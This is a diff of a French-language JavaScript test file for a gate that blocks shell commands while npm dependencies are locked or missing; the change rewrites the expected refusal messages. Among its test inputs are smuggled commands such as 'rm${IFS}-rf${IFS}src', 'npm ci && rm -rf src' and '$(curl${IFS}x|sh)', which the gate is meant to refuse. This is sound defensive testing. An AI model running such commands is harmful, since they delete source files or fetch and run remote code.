@@ -84,7 +84,7 @@ test('franchir : verrou tenu par un PID vivant → refus à l’échéance, qui 
     assert.equal(charge, false, 'rien n’est chargé derrière un verrou tenu')
     assert.equal(vu.rendu, undefined)
     assert.ok(vu.ms >= ATTENTE_BARRIERE.echeanceMs, `${vu.ms} ms`)
-    assert.equal(vu.refus, `outillage de ${a.principal} en mise à jour : verrou ${chemin} tenu par le PID ${process.pid} (npm ci) — relancer l'appel une fois la mise à jour finie ; si le PID ${process.pid} n'exécute pas npm ci, supprimer ${chemin}`)
+    assert.equal(vu.refus, `[transitoire · retentable] outillage de ${a.principal} en mise à jour : verrou ${chemin} tenu par le PID ${process.pid} (npm ci) — relancer l'appel une fois la mise à jour finie ; si le PID ${process.pid} n'exécute pas npm ci, supprimer ${chemin}`)
   } finally {
     a.jeter()
   }
@@ -95,7 +95,7 @@ test('franchir : un chargement qui lève → refus nommé avec son geste de rép
   try {
     const vu = await essai(a.principal, { charger: async () => { throw new Error('module à moitié écrit') } })
     assert.equal(vu.rendu, undefined)
-    assert.equal(vu.refus, `outillage de ${a.principal} en panne : chargement des gardes impossible — module à moitié écrit — non retentable : corriger le module en panne par une édition de fichier, seul geste admis en session principale`)
+    assert.equal(vu.refus, `[panne · non retentable] outillage de ${a.principal} en panne : chargement des gardes impossible — module à moitié écrit — corriger le module en panne par une édition de fichier, seul geste admis en session principale`)
   } finally {
     a.jeter()
   }
@@ -136,7 +136,7 @@ test('franchir : une dépendance npm absente laisse passer son installation exac
     for (const command of ['npm ci --no-audit', 'npm install --omit=dev', 'npm --prefix server ci'])
       assert.equal((await essai(a.principal, { charger, entree: bash(command) })).refus, null, command)
     for (const command of ['npm ci && rm -rf src', 'npm ci --x=a;rm${IFS}-rf${IFS}src', 'npm install --foo=$(curl${IFS}x|sh)', 'npm ci --x=a|tee${IFS}src/x.ts'])
-      assert.match((await essai(a.principal, { charger, entree: bash(command) })).refus, /dépendance npm absente, non retentable : lancer `npm ci`/, command)
+      assert.match((await essai(a.principal, { charger, entree: bash(command) })).refus, /^\[panne · non retentable\] .*dépendance npm absente : lancer `npm ci`/, command)
   } finally {
     a.jeter()
   }
